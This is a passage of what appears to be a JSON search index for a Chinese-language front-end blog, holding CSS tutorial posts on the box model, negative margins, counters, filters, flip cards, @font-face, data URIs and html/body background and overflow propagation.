不要做版控的檔案，就不要放到資料夾 為了避免命名衝突，每一個資料夾都會用亂數來命名 為了知道哪個版本最新？版本的順序？我們建立了兩個檔案來做紀錄 不知道你有沒有發現，其實這就是「Git」在幫你做的事情！ 雖然背後的原理不完全是這樣子，但只要用這種方式下去思考，我保證你不再覺得 Git 有什麼困難的。","link":"/2021/12/12/create-your-own-version-control/"},{"title":"CSS 之 margin 負值的內涵","text":"一個還蠻有意思的差異。 關於 margin 負值margin 負值雖然不是個太複雜的概念，但它其實蠻藏著一些小陷阱。 舉例來說，你可能知道 margin 負值可以把某個元素往反方向移動，但如果我現在告訴你：margin-left: -20px 跟 margin-right: -20px 其實有差異的，你能說出是哪個地方有差異嗎？ 這是我在 stackoverflow 找到的資料： left and right negative margins don’t behave the same : negative margin-left pulls the styled element towards the left, while negative margin-right pulls the adjacent right element towards the styled element. It doesn’t move the styled element itself. 簡單來說： margin-left 負值：把元素自己往左邊拉。 margin-right 負值 : 把元素右邊的元素往自己這邊拉（元素自己不會移動）。 我們來試試看： 1234567891011&lt;section class=\"left\"&gt; &lt;h2&gt;margin-left 負值&lt;/h2&gt; &lt;div class=\"target\"&gt;Target&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;/section&gt;&lt;section class=\"right\"&gt; &lt;h2&gt;margin-right 負值&lt;/h2&gt; &lt;div class=\"target\"&gt;Target&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;/section&gt; 12345678910111213141516171819202122232425section { width: 500px; margin: 100px auto; font-family: sans-serif; border: 1px solid #000;}div { display: inline-block; width: 100px; height: 100px; background-color: orange; vertical-align: middle; line-height: 100px; text-align: center;}div.target { background-color: pink;}/* 重點是這邊，其他不重要 */.left .target { margin-left: -50px;}.right .target { margin-right: -50px;} 結果：","link":"/2022/01/16/css-about-negative-margin/"},{"title":"CSS 的絕對定位範圍","text":"懶人包系列。 不包含 border子層的定位範圍只到「父層的 border 以內」，看下面兩個例子。 父層設 padding： 1&lt;div class=\"box\"&gt;&lt;/div&gt; 12345678910111213141516171819.box { width: 100px; height: 100px; /* 只加 padding */ padding: 10px; background-color: chartreuse; margin-top: 100px; margin: auto; position: relative;}.box::after { content: ''; position: absolute; top: 0; left: 0; width: 50px; height: 50px; background-color: violet;} Output： 現在加上 border： 1234567891011121314151617181920.box { width: 100px; height: 100px; padding: 10px; /* 加上 border */ border: 10px solid red; background-color: chartreuse; margin-top: 100px; margin: auto; position: relative;}.box::after { content: ''; position: absolute; top: 0; left: 0; width: 50px; height: 50px; background-color: violet;}","link":"/2022/01/22/css-absolute-problem/"},{"title":"CSS 盒模型（box-model）","text":"大家都是盒子。 盒子的構成一個盒子是由四個元素來組成的： content padding border margin（這個不用管，他就是外間距，對盒子本身沒有太大影響） 很常發生的問題假設你有個盒子設定成： 1234.box { width: 200px; height: 100px;} 你可能會以為盒子寬高就是 200 x 100： 可是如果現在加上 padding 跟 border，就跟你想的不一樣了： 123456.box { width: 200px; height: 100px; padding: 10px; border: 5px solid black;} 現在盒子的寬高不是 200 x 100 了，因為 padding 跟 border 會改變盒子的大小，可以想成是「從盒子裡往外加出去」。 因此盒子的寬高是：230 x 130： 寬 = 200 + 20 + 10 = 230 高 = 100 + 20 + 10 = 130 所以如果你希望盒子的寬高是 200 x 100，你得改成這樣設定： 12345678.box { /* 200 - 20 - 10 */ width: 170px; /* 100 - 20 - 10 */ height: 70px; padding: 10px; border: 5px solid black;} 解決惱人的計算問題 box-sizing為了解決每次都要計算 border 跟 padding 的問題，你可以用 box-sizing 來改變盒子的計算方式： content-box 只計算到 content border-box 把 border 跟 padding 包含進來 簡單來說只要你設定成 border-box，就不用再去算 padding 跟 border ，它會自動幫你計算好。 1234567.box { box-sizing: border-box; width: 200px; height: 100px; padding: 10px; border: 5px solid black;} 這樣盒子的尺寸永遠都會是 200 x 100，再也不用擔心 padding 跟 border。","link":"/2022/01/13/css-box-model/"},{"title":"CSS 動畫漢堡按鈕","text":"放在這裡之後要拿比較方便。 簡述12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const HamburgerSecondWrapper = styled.button` position: relative; display: flex; justify-content: center; align-items: center; width: ${HamBurgerConfig.width}px; height: ${HamBurgerConfig.height}px; border: none; background-color: transparent; cursor: pointer; ${MEDIA_PC} { display: none; } ${({ $isMenuOpen }) =&gt; $isMenuOpen &amp;&amp; ` &amp; &gt; ${HamburgerSecondInner} { transform: rotate(135deg); } &amp; &gt; ${HamburgerSecondInner}::before { transform: rotate(90deg); } &amp; &gt; ${HamburgerSecondInner}::after { transform: rotate(90deg); } `}`;const HamburgerSecondInner = styled.span` width: ${HamBurgerConfig.width}px; height: ${HamBurgerConfig.weight}px; background-color: ${({ theme }) =&gt; theme.green_400}; transition: all 0.5s ease-in-out; border-radius: 4px; &amp;::before, &amp;::after { content: \"\"; position: absolute; left: 0; width: 32px; height: ${HamBurgerConfig.weight}px; border-radius: 4px; background-color: ${({ theme }) =&gt; theme.green_400}; transition: all 0.3s ease-in-out; } &amp;::before { transform: translateY( -${Math.floor((HamBurgerConfig.height - HamBurgerConfig.weight) / 2)}px ); } &amp;::after { transform: translateY( ${Math.floor((HamBurgerConfig.height - HamBurgerConfig.weight) / 2)}px ); }`; 元件： 123456&lt;HamburgerSecondWrapper $isMenuOpen={isMenuOpen} onClick={handleToggleMenu}&gt; &lt;HamburgerSecondInner /&gt;&lt;/HamburgerSecondWrapper&gt; 效果：","link":"/2022/04/13/css-burger-button/"},{"title":"網頁中的英文大小寫問題","text":"冷冷冷，有夠冷知識。 為什麼你該使用 CSS 來設定不知道你有沒有碰過這個問題，我覺得這個問題也許還蠻少人知道的。 假設有個 HTML 長這樣： 1&lt;p&gt;THIS JOKE IS SO FUNNY.&lt;/p&gt; 如果你用 螢幕閱讀器（Screen reader） 來跑的話，它會「一個字一個字來唸（T-H-I-S….）」。 所以為了避免這個問題，應該這樣子做： 1&lt;p&gt;This is a funny joke/&lt;/p&gt; 123p { text-transform: uppercase;} 雖然最後結果看起來會一模一樣，但是螢幕閱讀器能夠正常的念出這段敘述。","link":"/2022/01/16/css-case-problem/"},{"title":"CSS 中的 counter 屬性","text":"用擬元素來自製列表清單。 作法當你想要產生一串「按照順序編號」的元素時，除了使用 HTML 中的 &lt;ol&gt; 之外，你也能用 CSS 中的 counter 屬性來實作。 至於支援度的話不用擔心，除了舊版 IE 都可以運作： 但要注意，counter 是利用擬元素的 content 屬性來設定數字的，所以必須搭配擬元素來使用。 直接來看例子吧： 123456789&lt;!-- 一個 box 裡裝了 6 種顏色的方塊 --&gt;&lt;div class=\"box\"&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { // 在祖先元素初始化計數器 // 看你想取什麼名字 counter-reset: order; // 也可以指定初始值，這樣就會從 10 開始算 // 如果要顯示 0, 1, 2... 可以設成 \"-1\" counter-reset: order 10;}.item::before { // 把計數器的值寫到 content 裡 content: counter(order); // 填入要遞增的計數器名稱 counter-increment: order;} 設定完成後，就能得到以下結果： 🚀 Codepen：點這裡 更多的設定細節，可以到上面 Codepen 裡面看註解，或是參考這裡 最後做一些補充： counter-reset可以設定在任何的「祖先元素」上，不一定要直屬父層。 計數器是透過 counter-increment 來做計數，所以請設定在要計算的元素上。","link":"/2022/01/16/css-counter-property/"},{"title":"CSS 之我的 scrollbar 比較好看","text":"還不錯用。 用法不喜歡瀏覽器的預設滾軸嗎？告訴你一個好消息，其實可以用 CSS 改。 要設定滾軸樣式可以用 ::-webkit-scrollbar 相關的 pseudo-class 來做設定： 123456789101112131415161718// 滾軸的容器element::-webkit-scrollbar { // 垂直滾軸 width: 8px; // 水平滾軸 height: 8px; background-color: transparent;}// 滾軸的內容器element::-webkit-scrollbar-track { border-radius: 10px; background-color: transparent;}// 用來滑的那一塊東東element::-webkit-scrollbar-thumb { border-radius: 10px; background-color: #555;} 這邊附上我參加 Frontend Mentor 挑戰中的範例，有興趣的話可以參考一下。 不過你應該有注意到關鍵字： webkit 沒錯，這個方法只適用於 Webkit 瀏覽器（Chrome 和 Safari），因此要在其他瀏覽器上改的話得用 JavaScript 才有辦法。 想了解更多可以參考 這個網站","link":"/2022/01/16/css-customize-scrollbar/"},{"title":"CSS－客製 File 元件","text":"現在才發現的小技巧。 簡述以往要做 File 元件時我都是用 absolute + opaicty 的障眼法來把原生元件覆蓋在客制元件上，就能享有原生自動跳出 dialog 的功能。 這邊的 HTML 和 CSS 大概會這樣設計： 123456&lt;div class=\"custom-upload-wrapper\"&gt; &lt;div class=\"custom-upload-element\"&gt; &lt;span&gt;Filename goes here...&lt;/span&gt; &lt;input class=\"custom-upload-native\" type=\"file\" /&gt; &lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829.custom-upload-wrapper { margin: 20px auto; max-width: 300px; .custom-upload-element { position: relative; display: block; border: 1px solid #033076; border-radius: 4px; padding: 9px 10px; font-size: 14px; color: #021f54; transition: all 0.3s; &amp;:hover { box-shadow: 0 0 0 2px rgba(2, 31, 84, 0.2); } } .custom-upload-native { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; // hide native element opacity: 0; z-index: 999; text-indent: -999px; }} 不過其實除了這種作法之外，有一個更簡單的技巧是透過 &lt;label&gt; 來處理，這個技巧是把 input file 包在 &lt;label&gt; 裡面，並且設為 display: none： 1234&lt;label class=\"custom-upload-wrapper\"&gt; &lt;span class=\"custom-upload-element\"&gt;Filename goes here...&lt;/span&gt; &lt;input class=\"custom-upload-native\" type=\"file\" /&gt;&lt;/label&gt; 你會發現神奇的事情發生了，照理說你應該是沒辦法點擊到 input 的，不過因為 label 的特性就是會把事件反應到對應的 input 元件上，所以即便設為 display: none 也一樣能觸發 dialog 的功能！ 所以 CSS 可以簡化許多： 12345678910111213141516171819202122.custom-upload-wrapper { display: block; margin: 20px auto; max-width: 300px; .custom-upload-element { display: block; border: 1px solid #033076; border-radius: 4px; padding: 9px 10px; font-size: 14px; color: #021f54; transition: all 0.3s; cursor: pointer; &amp;:hover { box-shadow: 0 0 0 2px rgba(2, 31, 84, 0.2); } } // no need to worry about this .custom-upload-native { display: none; }} 現在事情好辦了，你完全不需要對原生元件做額外處理，只要專注在你的客制元件上就行了。 這邊的實際範例可以到 Codepen 上參考。","link":"/2022/08/29/css-customize-upload-component/"},{"title":"CSS 利用 DataURI 來節省流量","text":"一個我現在才知道的操作。 簡述簡單來說就是把圖片用 base64 編碼後寫在 HTML 裡，這樣就不需要發 request。 雖然看起來好像還是有發 request，但可以注意到 Time 為 0，所以這應該不算。 可以參考下圖做個對照： 上面是 base64 的 URI，下面是用一般的 URI。 用法格式的部分很簡單，只要這樣寫就好： data:[&lt;MIME類型&gt;][;charset=&lt;charset&gt;][;編碼方法],&lt;編碼資料&gt; MIME 類型可以參考這裡：MIME types: Complete list of MIME types 因為只是把要引入的東西換掉而已，所以 src 跟 background-image 都能用： 1&lt;img src=”data:image/png;base64,iVBORw0KGgoAAAANSUh略…(很長一串)” /&gt;` 123.element { background-image: url(‘data:image/png;base64,iVBORw0KGgoAAAANSUh略…’);} 至於怎麼做 base64 編碼？Google 一下應該就能找到線上編碼服務，不過我是習慣直接用 CLI 比較快： 1cat button.png | base64 實作這邊我懶，所以就拿 CSS 利用 Sprite 來提升效能 的範例來改： 123456789button { width: 51px; height: 51px; background-image: url('data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAJoAAAAzCAIAAADgjoZmAAAEiklEQVR4nO2caUwVVxTH/4hgxAJaxYWiz/AIilbLHi01LoCNJV1j2zRETRupGI1GP/RDbWPS6gf7xbSxTU262KAYo42J3WyDicYmQrGySnCBqkCLyA4PZPccJNX3eESZO86Qm/MLTN4smXve/Oaee+4lAQOCRvjQ75KDGIPkboIENioosPF2xyCYiejUCtGpFaJTK0SnVohOrRCdWiE6tUJ0aoXo1ArRqRWiUytEp1aITq0QnVohOrVCdGqF6NQKc3SO80FsKOKfQWgg795uR1Et8qrQ02/K7YXHxQSdi2bgoxVwTHY7uG5Q6t5z+KtavYVRszEO6dGYOOzLdfaishHHSvDHdRui8mD6JGxbiusNOFRg2j1VdT4/B/tWw8+XtdFjulLPPXXxTGTEs+D9a7ArB2f/MSXUUfBuLHzHoaMHhf+h96EMERaMhdPxSTKaOpFfY3VUHmxfimQnUpworOU4TUFJ59QAfJrMLrOL8cWFB8dzKnD+Jj5cjhcj8H6CDTrJ5QD10ZOobPI8tXsl1kQiyWGzzsipWOVEXz+HmpmAzFPm3FZJ5zuLMckf5XdwINfzVFcvdp/hLtvWpdKCcVzdXlwSF2tYZ/+A5QG5k5kIH+CzP/HWs4iehSWzkVtlwm2VdC5z8PZ46YhP55crKrc3HxoIVobzhwKTkpsxaDCiQaq2nZ8PjQiU4TYljAGdYUG8La0zIQ7Tecofe1PcBk5ifghCg/BlHs7fsCeq+2xO5O3hQg7vTAXXGVEhWD4X55SjUtJJeZ/o7FEN4glBhcZw6l3w90WAH3cLW0gMQ8ws1HfgVDnvUmL7oQAfr+AigwoOxVFASSfV/TQZCJyAOpdSEE+Cu71I/d5z4jstAG8v4t5As+QtP9kTWOZg18wuQnff0JHT13hm5XwaqU78rjaDUtJ5o4mzBD2aikbvF1DpS33Xln5AeWz4Igb1ia/ysDoCcaGYHYyqFqujooy6IAQtd3Gy7MFBqm+zCvHBMmyMR04l7xpGSSfNQEhn+nM4fRVt3Z5nX3Dw6FVyG1t/VmnEZCiZuQZfr6AJVjdNhRhlVKKrDzuS3E7dD4besLTIoSRsDCWdJy7j1She2DvwMvacxbWGoeM0e1kXjfXR/AVIpy1QDHOCcWtY/6OSMnwKD1HVrVaHlBrBGRWD60GvzPd+zXux+O2q8cVRJZ00t9vxK/a/hHnTkLUWN5tR08ovGu36+fIj++ZvfHtRpQWDUNP0Jn33Bopr3YrbKRN5VYigHkAZz0qobMyI4w9f5+PQJS8XUAly5E3MDMRrC3juZwzVRT5SmH4cr0fxfI5ePcdkfpR3XLj0Ly8V/d9fLeZYCdYu5LkK9cWH6enDrWYuPbKKrA4pJZyXGBs7cbTY+wVtXTx12ZmEDTE4UQpjFa4JS/BU7JC57BGitIXPL/DPmKKqFQ0dOJjP62UjQTkjbR5nOMOzFfl7p0WU1SEt6xHX0ORqw49KrYhOrRCdWiE6tUJ0aoXo1ArRqRWiUytEp1aITq0QnVohOrVCdGqF6NQK0akXdv9/ZMFM7gEDz+rb9FQSCQAAAABJRU5ErkJggg=='); background-repeat: no-repeat; background-color: transparent; border: none; padding: 0;} 輸出結果： 確認一樣是可以 work 的！ DataURI 的缺點 不會 cache（但我不太確定為什麼 devtool 還是會顯示 memory cache） HTML 容量會變肥 轉成 base64 後有字數限制（以 Opera11 來舉例的話是 65000 個字左右）","link":"/2022/03/05/css-datauri/"},{"title":"CSS 中那些常常忘記的預設值","text":"記起來方便查。 background background-color: transparent background-repeat: repeat background-attachment: scroll button 標籤 background-color border padding :focus 時的 outline font-family font-size 存在於 &lt;form&gt; 中的按鈕，會自動被視為是送出表單的按鈕，所以按下時會出現跳轉的行為。 a 標籤 text-decoration color display: inline input 標籤 :focus 時的 outline padding border-style:inset flex-box flex-shrink: 1，每個 item 平均壓縮 align-items: stretch，次軸 items 等寬 justify-content: flex-start 主軸並沒有 justify-self 這個屬性","link":"/2022/01/16/css-default-value/"},{"title":"CSS 中的 display 屬性","text":"display 三兄弟。 block代表元素：&lt;div&gt; &lt;h1&gt; &lt;p&gt; 可設定寬高 margin padding 正常作用 自己會佔據一整行 inline代表元素：&lt;span&gt; &lt;a&gt; 不能設寬高 上下 margin 沒用 上下 padding 不會影響旁邊元素 inline-block代表元素：&lt;input&gt; &lt;select&gt; 可以設定寬高 margin padding 正常作用 可以跟別人排再一起","link":"/2022/01/12/css-display/"},{"title":"CSS 好用的 filter 屬性","text":"加上 filter 後質感立馬提升！ 列表主要會用在圖片上的屬性（但不僅限於圖片），簡單來說就是濾鏡，看範例最快！ filter: brightness() 設定明亮度 1234/* 設成 150% 也可以 */img:hover { filter: brightness(1.5);} filter: blur() 設定模糊 123img:hover { filter: blur(2px);} filter: contrast() 設定對比度 1234/* 也可以設成 1000% */img:hover { filter: contrast(10);} filter: drop-shadow() 設定陰影 123img:hover { filter: drop-shadow(16px 16px 20px aqua);} 跟 box-shadow 的差異是它能判斷透明的部分，而不是直接加在外框上，參考下圖： filter: grayscale() 設定灰階 123img:hover { filter: grayscale(1);} filter: hue-rotate 色調旋鈕 暫時不知道能做什麼，但很酷！ 123456789101112img { animation-name: colorful; animation-duration: 2s;}@keyframes colorful { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); }} filter: invert 負片效果 1234/* 注意只有 0 ~ 100% 之間的值有效 */img:hover { filter: invert(80%)} filter: saturate 飽和度 123img:hover { filter: saturate(2)} filter: sepia 懷舊效果 1234/* 預設值為0，需要 0 ~ 1之間的值 */img:hover { filter: sepia(0.5)}","link":"/2022/01/28/css-filter/"},{"title":"CSS－Flip Card","text":"久違的 CSS。 簡述有些時候可能會需要用到這個酷炫的效果： 原本我以為這很難搞，不過學完後發現其實沒那麼複雜，所以就順便記錄一下吧！ 範例在寫 CSS 前要先解釋一下 HTML 結構。不用想得太負責，其實就跟現實中的卡片一樣，一張卡片會有正面跟反面，所以 HTML 也會分成兩塊，一塊是「正面的內容」，一塊是「反面的內容」： 12345678&lt;div class=\"card\"&gt; &lt;div class=\"card__inner front\"&gt; &lt;p&gt;Front&lt;/p&gt; &lt;/div&gt; &lt;div class=\"card__inner back\"&gt; &lt;p&gt;Back&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 我們先加上一些卡片的預設樣式： 123456789101112131415161718192021222324body { background-color: #1b1523; font-size: 2em; color: #fff;}.card { display: inline-block; margin: 40px;}.card__inner { width: 200px; height: 200px; display: flex;}.card__inner p { margin: auto;}.card .front { background: #2aac9e;}.card .back { background: #6351c3;} 加完後，畫面應該會長這樣： 接下來，在卡片還沒有被翻面前，我只希望他顯示「Back」的部分，所以我們可以把 .front 部分改成這樣： 12345.card .front { position: absolute; transform: rotateY(90deg); background: #2aac9e;} 結果就會變這樣： 我一開始很疑惑，為什麼這樣正面就消失了？ 這是因為 absoulte 跟 rotateY 的設定。順道一提，一直到寫這篇筆記後我才知道 rotate 原來是可以指定 Y 軸跟 X 軸的值的。 首先 absoulte 是為了讓 .front 脫離「排版流」，藉此讓 .back 來遞補 .front 讓出來的空間。 也就是說這個時候的 .front 其實是疊在 .back 身上的，只是因為又加了 rotateY(90deg) 才消失的。 怎麼做到的？來看下面這張圖應該就理解了： 用三維空間的角度來思考 X 軸跟 Y 軸應該就能理解了。 總之做到這邊後，其實就差不多完成了。剩下的只是加上一下 transition 的效果而已： 1234567891011121314151617181920.card .front { position: absolute; transform: rotateY(90deg); background: #2aac9e; transition: transform 0.2s;}.card .back { background: #6351c3; transform: rotateY(0deg); transition: transform 0.2s; transition-delay: 0.2s;}.card:hover .front { transform: rotateY(0deg); transition-delay: 0.2s;}.card:hover .back { transform: rotateY(90deg); transition-delay: 0s;} 這邊會看不太懂的地方應該是 delay 的部分。簡單來說，這樣寫的用意是希望在 hover 的時候： .front 等 0.2s 後再秀出來 .back 等 0s 後就藏起來 總而言之延遲的目的是讓動畫看起來沒有衝突，這就是 delay 的用意。 如果還是不太懂的話，建議先去重溫一下 delay 是怎麼運作的，之後再回來看應該就懂了。 想實際玩玩看的話可以到 這邊 參考。","link":"/2022/06/27/css-flip-card/"},{"title":"CSS－使用 font-face 來設定字型的方法","text":"雖然 CDN 很方便，但有時候是得用到這種方式比較穩定。 簡述一般常用的是 url 的方式： 1@import url('https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;&amp;display=swap'); 但有些時候可能不想透過這種 url 的方式來處理，這時就可以改用 @font-face 的方式來改寫： 123456789101112131415161718192021222324@font-face { font-family: 'Nunito'; font-weight: 200; font-style: normal; src: url('../public/font/Nunito-ExtraLight.ttf') format('truetype');}@font-face { font-family: 'Nunito'; font-weight: 200; font-style: italic; src: url('../public/font/Nunito-ExtraLightItalic.ttf') format('truetype');}@font-face { font-family: 'Nunito'; font-weight: 300; font-style: normal; src: url('../public/font/Nunito-Light.ttf') format('truetype');}@font-face { font-family: 'Nunito'; font-weight: 300; font-style: italic; src: url('../public/font/Nunito-LightItalic.ttf') format('truetype');} 這邊簡單來說就是在設定等一下要怎麼用它，摘要幾個重點： font-family 可以幫這個字型取名稱（如果你不想用原來的名字） font-weight 該字型的寬度數值 font-style 哪一種樣式，例如：normal 或 italic src 檔案的位置，可以是專案資料夾，也可以是 url format 該字型的格式 副檔名 format .woff \"woff\" .ttf \"truetype\" .ttf 或 .otf \"opentype\" .eto \"embedded-opentype\" .svg 或 .svgz \"svg\" 如果想知道更多細節，推薦參考這篇。","link":"/2022/06/25/css-font-face/"},{"title":"CSS 之什麼時候該設定成相對單位","text":"寫 RWD 最難搞的就是單位了。 個人建議我覺得新手在對 RWD 不太熟的時候常會分不清楚什麼時候該使用「相對單位」，什麼時候該用「絕對單位」，所以以下是我的一些建議： 會隨著寬度來做改變的區塊，應該要將其 width 設為 % 文字或區塊之間的 margin，padding 則要視情況，如果設為 %，則當寬度越大的時候，文字或區塊之間的間距也會跟著逐漸變大，所以這部分要自己斟酌。 有些區塊的 padding。如果四個邊都有設 padding，那就要考慮到，當寬度越寬的時候，這個區塊的內容就會越往裡面推，所以要考慮內容本身會不會隨著寬度增加而變大？如果不會，那差距就隨著寬度會越來越大。 如果希望一個區塊的width height會隨著視窗增加的時候，或許就需要設 %。","link":"/2022/01/16/css-good-time-to-use-percentage-unit/"},{"title":"CSS 中 html 與 body 的向上傳遞行為","text":"以前寫的好深奧。 為什麼要討論這個東西？讓我先問問看，你有沒有曾經碰過以下的問題，但卻不知道為什麼會這樣？ 為什麼 &lt;body&gt; 的高度不管是多少，它的 background-color 都會套用到整個畫面？ 為什麼 overflow 的預設值明明是 visible，但當內容超出 &lt;body&gt; 時，仍會產生滾軸？ 這是因為有個叫 「Propagating behavior（傳遞行為）」 的機制，這個行為只會發生在 &lt;body&gt; 跟 &lt;html&gt;這兩個元素上。 網頁最底層的背景顏色 Canvas一個網頁中除了我們看到的畫面之外，它的最底層其實是一個「Canvas(畫布)」。 Canvas 是一個佔據整個網頁畫面的一張紙，我們網頁中所有的內容、樣式設定，都是放在這張畫布上面來呈現的。 關於 Canvas，W3C 的規範中提到了這一段： Since no element corresponds to the canvas, in order to allow styling of the canvas CSS propagates the background of the root element (or, in the case of HTML, the &lt;body&gt; element). 大意是指： 既然網頁上沒有一個能夠代表 Canvas 的元素來讓我們直接設定，那就讓 CSS 藉由傳遞根元素（html）或是 &lt;body&gt; 的背景色，來對 Canvas 做設定。 也就是說，我們實際上都是透過根元素來設定 Canvas 的背景色，像這樣： 1234567html { // 背景色會被傳遞到Canvas background-color: #ffa; // 就算設定了高度，背景色仍顯示全屏， // 因為 Canvas 的範圍是整個頁面 height: 100px;} 如果覺得有點抽象的話，你也可以想像成是這樣子： 123456Canvas { background-color: #ffa;}html { height: 100px;} 所以網頁最底層的背景色是由 Canvas 來決定的，&lt;html&gt; 只是負責把背景顏色傳遞給 Canvas 而已。 Codepen： See the Pen html-background-color by jim (@jubeatt) on CodePen. 不過規範中似乎有提到 &lt;body&gt; 也能夠傳遞背景色給 Canvas，這又是怎麼一回事呢？ 我們再來看個例子： 現在我們不對 &lt;html&gt; 做背景色的設定，而是對 &lt;body&gt; 設定背景色，看看會發生什麼： 123body { background-color: #ffa;} See the Pen body-background-color / When html doesn't have a backgroundColor. by jim (@jubeatt) on CodePen. Wow，就和 &lt;html&gt; 一樣，&lt;body&gt; 把背景色給傳遞給 Canvas 了！ 其實這個說法只對了一半，實際上是這樣子： &lt;body&gt; 先把背景色傳給 &lt;html&gt; &lt;html&gt; 再把背景色傳給 Canvas 這個部分我們再來看一段 W3C 的規範說明： For documents whose root element is an HTML HTML element [HTML401] or an XHTML html element [XHTML11]: if the computed value of ‘background-image’ on the root element is ‘none’ and its ‘background-color’ is ‘transparent’, user agents must instead propagate the computed values of the background properties from that element’s first HTML BODY or XHTML body child element. The used values of that BODY element’s background properties are their initial values, and the propagated values are treated as if they were specified on the root element. It is recommended that authors of HTML documents specify the canvas background for the BODY element rather than the HTML element. 大意是指： 在規範中根元素為 &lt;html&gt; 的文件檔案（HTML 或 XHTML），如果根元素 “background-image” 的值為 “none” 且 “background-color” 的值為 “transparent”，則 user agents 必須以根元素中的 &lt;body&gt; 來傳遞 background 設定給 Canvas。看起來就跟指定值給根元素很類似，但這只是一個錯覺，實際上這個值是從 &lt;body&gt; 傳遞過去的。 另外，規範中建議以 &lt;body&gt; 來設置 Canvas 的背景樣式，不要用 &lt;html&gt;。 💡 註：user agents 指的是瀏覽器的預設樣式，在 W3C 規範中有時會縮寫成 UAs 詳細的流程可以整理成這樣： html 只要有設定背景色 → 一律將html的背景色傳遞到 Cavas。 html 沒有設定背景色 &amp; body 有設置背景色 → 將背景色傳遞給 html → 再傳遞到 Cavas。 html 沒有設定背景色 &amp; body 沒有設置背景色 → Cavas 預設呈現白色。 看的有點亂吧，讓我們講白話一點： 只要沒有設定 &lt;html&gt; 的 background-image 跟 background-color，那就一律採用 &lt;body&gt; 的設定。 關於網頁中的滾軸接著來討論第二個問題：為什麼內容超出 &lt;body&gt; 時，仍會產生滾軸？ See the Pen html&amp;body-scrollbar by jim (@jubeatt) on CodePen. 照理來說，每個元素的 overflow 預設值都是 visible，怎麼還會產生滾軸？ 其實這個道理跟剛剛背景色的傳遞行為一樣，讓我們再來看一段規範： UAs must apply the overflow-_ values set on the root element to the viewport. However, when the root element is an [HTML] html element (including XML syntax for HTML) whose overflow value is visible (in both axes), and that element has a body element as a child, user agents must instead apply the overflow-_ values of the first such child element to the viewport. The element from which the value is propagated must then have a used overflow value of visible. 大意是指： 瀏覽器必須套用根元素 &lt;html&gt; 的 overflow 值傳遞給 viewport（視窗），但如果根元素 &lt;html&gt; 的 overflow 值為 visible，則瀏覽器必須以 &lt;body&gt; 的 overflow 值傳遞給 viewport（視窗）。 💡 註：user agents 指的是瀏覽器的預設樣式，在 W3C 規範中有時會縮寫成 UAs 所以在規範中我們可以先釐清兩件事情： 瀏覽器產生的滾軸是由 viewport（視窗） 來控制的，不是 &lt;html&gt; 或 &lt;body&gt;。 viewport 本身無法設定 overflow ，必須藉由 &lt;html&gt; 或 &lt;body&gt;來傳遞。 再把規範中的內容整理一下： &lt;html&gt; 設定 visible 以外的值時，一律將這個值傳給 viewport。 &lt;html&gt; 設定 visible 時，先將&lt;body&gt;的 overflow 值傳給&lt;html&gt;，再傳遞給 viewport。 除此之外，規範中還提到了這一段： If visible is applied to the viewport, it must be interpreted as auto. If clip is applied to the viewport, it must be interpreted as hidden. 意思是指： 如果 viewport 套用的 overflow 值為 visible，則會被解譯為 auto。 如果 viewport 套用的 overflow 值為 clip，則會被解譯為 hidden。 所以讓我們來看看，在預設值的情況下，滾軸是怎麼產生的。 1234html { // 預設值 overflow: visible;} &lt;html&gt; 的值為 visible，所以參考 &lt;body&gt; 的 overflow。 1234body { // 預設值 overflow: visible;} viewport 最後得到的值。 123Viewport { overflow: visible;} viewport 經過解譯後的值。 123Viewport { overflow: auto;} 這就是為什麼，即便你明明沒有做任何設定，在預設值 overflow: visible 的情況下，卻還是能夠產生出滾軸的原因。","link":"/2022/01/16/css-html-and-body-propagating-behavior/"},{"title":"CSS 之 <html> 與 <body> 的寬高","text":"以前常搞混的觀念。 簡述如果對 &lt;html&gt; 跟 &lt;body&gt; 的寬高設定「相對單位」時，要特別注意它們的參考對象是誰： &lt;html&gt; 參考到視窗（viewport） &lt;body&gt; 參考到 &lt;html&gt; 只要搞清楚參考對象，就不會搞混一些東西。 我以前沒弄懂的事不知道你們會不會跟我一樣，以前經常看不懂這段原始碼的意思： 1234html,body { height: 100%;} 這段原始碼通常是用來讓我們做出一個跟視窗一樣高的全屏畫面，但一直以來讓我想不通的問題是：為什麼不直接設定 body: 100% 就好，還要加個 html ？ 不過在理解相對單位的參考對象後，我就能解釋那段原始碼的意思了： 12345678// html 設定高度 100%，代表與視窗的高度 x 100%。html { height: 100%;}// body 設定高度 100%，代表 html 的高度 x 100%。body { height: 100%;} 所以如果我們只有寫 body: 100%，就會變成這樣： 12345// body 設定高度 100%，代表與html的高度 x 100%。// 思考看看，此時 html 的高度是？body { height: 100%;} 在 html 沒有做任何高度的設定的情況下，它的高度會是 0，所以 body 的實際高度是 0 x 100% = 0，這也就是為什麼一定要再加上一個 html 的原因。 很多時候我們會搞不清楚 body 與 html 之間的關係，這是因為我們往往沒有搞清楚它們的父元素是指向誰。但是當你搞清楚後，就不會常常搞混了。 記住這個原則： html 的父元素 → 視窗，body 的父元素 → html。 所以爾後你想做的設定會牽涉到父元素時，請務必先搞清楚父元素到底指向的是誰。","link":"/2022/01/16/css-html-and-body-width-height/"},{"title":"CSS 之 inline-block 中的魔法間距","text":"相信不少人都踩過的雷。 前言這應該已經是個被講到爛的東西，但如果有段時間沒碰 CSS 的話，還真的會不小心又踩到這個雷，所以這裡就當作再複習一遍吧。 問題點簡單來說，你可能想做這個畫面： 所以你就很直覺的寫了以下： 1234&lt;div class=\"wrap\"&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt;&lt;/div&gt; 123.item { display: inline-block;} 結果你卻得到： 嗯…其實是這傢伙在作怪： 